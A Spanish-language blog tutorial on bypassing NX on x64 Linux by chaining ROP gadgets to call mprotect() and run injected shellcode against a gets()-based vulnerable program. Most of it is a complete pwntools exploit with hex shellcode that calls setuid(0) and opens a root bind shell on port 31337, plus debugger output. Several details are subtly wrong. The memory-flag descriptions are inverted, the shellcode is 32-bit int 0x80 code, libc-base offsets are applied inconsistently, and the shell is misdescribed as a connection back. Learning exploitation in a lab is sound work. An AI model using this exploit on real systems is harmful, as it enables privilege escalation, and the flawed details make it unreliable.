---
layout: post
title: Bypass NX usando mprotect() en x64
author: c4rta
date: 2023-02-26
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, ROP]
image: /assets/img/heap2/waifu3.jpg
---
En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como ```ret2libc```, ```ret2reg```, mas que nada tecnicas que usen ```ROP```. Asi que ahora te voy a mostrar como usar ```mprotect()``` para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.
{:.lead}

## mprotect()

Segun la man page de Linux ```mprotect``` es:

mprotect () cambia las protecciones de acceso para las páginas de memoria del proceso de llamada que contienen cualquier parte del rango de direcciones en el intervalo [addr, addr+len-1]. addr debe estar alineado con el límite de la página... En caso de éxito, mprotect () devuelve cero. En caso de error, esta llamada al sistema devuelve -1 y errno para indicar el error. se establece

Y aca mas entendible seria que mprotect es la funcion que establece los permisos de lectura y escritura a cierta area de memoria. Esta funcion toma 3 argumentos:

- Una direccion inicial
- La longitud, que seria el rango en que podemos modificar
- Y una combinacion de banderas que son las que haran que se establezcan los permisos, estas banderas son:
    - **PROT_READ**: La memoria no se puede leer
    - **PROT_WRITE**: La memoria no se puede modificar/escribir
    - **PROT_EXEC**: La memoria no se puede ejecutar o no es ejecutable


## Crafteando el exploit

### Codigo vulnerable

```c
#include <stdio.h>

int main(int argc, char **argv){

    char input[256];
    gets(input);

    printf("%s", input);
    printf("\n");
    return 0;
}
```
No hace falta hacer reversing por que la vulnerabilidad se encuentra en la funcion ```gets```

Como estamos en 64 bits los primero 6 argumentos se pasan los registros RDI, RSI, RDX, RCX, R8 y R9, y cualquier cosa despues se empieza a pasar por el stack.

En x64 para poder hacer esta tecnica ocupados de:

- La direccion base de libc
- Un gadget **pop rdi**; ret: este funcionara para poner la direccion de la pila en rdi
- Un gadget **pop rsi**; ret: esta funcionara para poner la longitud en rsi
- Un gadget **pop rdx**; ret,: este funcionara para establecer el valor 0x7 en rdx, este valor es el de los permisos de lectura, escritura y ejecucion.

Algo asi se llamaria a la funcion mprotect:

```c
#incluye <sys/mman.h> 

       int mprotect(void * addr, size_t len, int prot);
                            |            |        |
                            |            |        |
                           RDI          RSI      RDX
```

### Sacando la direccion de libc

Dentro del debugger podemos ingresar el comando ```vmmap libc```, obviamente antes hay que ejecutar el binario. Podemos ver la direccion base de libc:

```
gef➤  vmmap libc
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x007ffff7db6000 0x007ffff7dd8000 0x00000000000000 r-- /usr/lib/libc.so.6
0x007ffff7dd8000 0x007ffff7f32000 0x00000000022000 r-x /usr/lib/libc.so.6
0x007ffff7f32000 0x007ffff7f8a000 0x0000000017c000 r-- /usr/lib/libc.so.6
0x007ffff7f8a000 0x007ffff7f8e000 0x000000001d4000 r-- /usr/lib/libc.so.6
0x007ffff7f8e000 0x007ffff7f90000 0x000000001d8000 rw- /usr/lib/libc.so.6
gef➤ 
```
La direccion que usare es ```0x007ffff7db6000```

### Offset del RIP

Como estamos en x64 podemos hacer uso del offset del RSP o del RBP y sumarle 8.

Como estoy usando GEF, ingresare el comando ```pattern create 300```, para generar 300 caracteres que le pasaremos como input. Una vez que el programa pete ingresare ```pattern offset $rbp``` para pasar el offset del RBP:

```
gef➤  pattern offset $rbp
[+] Searching for '$rbp'
[+] Found at offset 256 (little-endian search) likely
```
Ahora le sumamos 8 y nos da 264 que seria el desplazamiento para llegar al RIP.

Hace rato les mencione que mprotect recibia un argumento que es la longitud, debido a que la cadena que le metimos esta desde la direccion ```0x007fffffffe418```, podemos usar una direccion anterior lo suficientemente grande. Regularmente la longitud que se le pasa a mprotect en estos casos es ```0x1000```, la cual podra ser desde la direccion ```0x7ffffffffe000```

```
0x007fffffffe418│+0x0000: "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"	 ← aca estan
0x007fffffffe420│+0x0008: "jaaaaaabkaaaaaablaaaaaabmaaa"
0x007fffffffe428│+0x0010: "kaaaaaablaaaaaabmaaa"
0x007fffffffe430│+0x0018: "laaaaaabmaaa"
0x007fffffffe438│+0x0020: 0x007f006161616d ("maaa"?)
0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  "/home/c4rta/Downloads/mprotect"
0x007fffffffe448│+0x0030: 0xc91dfa2faf99b844
0x007fffffffe450│+0x0038: 0x0000000000000000
────────────────────────────────────────────
```

Hasta ahora nuestro exploit va asi:

```py
from pwn import *

p = process("./mprotect")

shellcode = b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7"
shellcode+= b"\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b"
shellcode+= b"\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66"
shellcode+= b"\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0"
shellcode+= b"\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50"
shellcode+= b"\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89"
shellcode+= b"\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68"
shellcode+= b"n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b"
shellcode+= b"\xcd\x80"

libc_base = 0x007ffff7db6000
rip_offset = 264
stack_addr = 0x7ffffffffe000
size = 0x1000
```

### Direccion de mprotect

Dentro de gdb podemos usar ```p mprotect``` y nos da esto:

```
gef➤  p mprotect
$1 = {<text variable, no debug info>} 0x7ffff7eb62f0 <mprotect>
```

### Direcciones de los gadgets

En mi caso usare ROPGadget pero puden usar ropper o radare2, aqui les puedo decir que no me arrojo ningun gadget, eso no es problema cuando se nos proporciona la libreria que esta usando, en este caso como lo compile en mi maquina, uso la libreria que se encuentra en ```/usr/lib/libc.so.6```, asi que esa la podemos usar para sacar los gadgets con el comando:

``` ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rdi"```: 0x0000000000023d35

``` ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rsi"```: 0x0000000000025641

``` ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rdx"```: 0x000000000004e062


### Ejecutando el exploit final

Despues de agregar lo que le falta tenemos este exploit:

```py
from pwn import *

p = process("./mprotect")

shellcode = b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7"
shellcode+= b"\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b"
shellcode+= b"\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66"
shellcode+= b"\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0"
shellcode+= b"\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50"
shellcode+= b"\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89"
shellcode+= b"\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68"
shellcode+= b"n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b"
shellcode+= b"\xcd\x80"

libc_base = 0x007ffff7db6000
rip_offset = 264
stack_addr = 0x7ffffffffe000
size = 0x1000
mprotect_addr = 0x7ffff7eb62f0
pop_rdi = 0x0000000000023d35
pop_rsi = 0x0000000000025641
pop_rdx = 0x000000000004e062

payload = b"\x90" * 264
payload += p64(pop_rdi)
payload += p64(stack_addr)
payload += p64(pop_rsi)
payload += p64(size)
payload += p64(0xAAAAAAAAAAAAAAAA) #junk para r15
payload += p64(libc_base + pop_rdx)
payload += p64(0x7)
payload += p64(mprotect_addr)
payload += p64(0x007fffffffe418) #direccion desde donde comenzara la shellcode
payload += shellcode

p.sendline(payload)
p.readline()
p.interactive()
```
**Ojo:** Antes de ejecutarlo hay que ponernos en escucha por el puerto 31337, ya que la shellcode ejecuta un ```setuid(0)``` y establece una conexion con nosotros mismos por ese puerto


```
󰣇  c4rta ~/Downloads  nc 192.168.1.76 31337 -v
Connection to 192.168.1.76 31337 port [tcp/*] succeeded!
whoami
root
```

Y asi conseguimos ser root, muchas gracias por leer ❤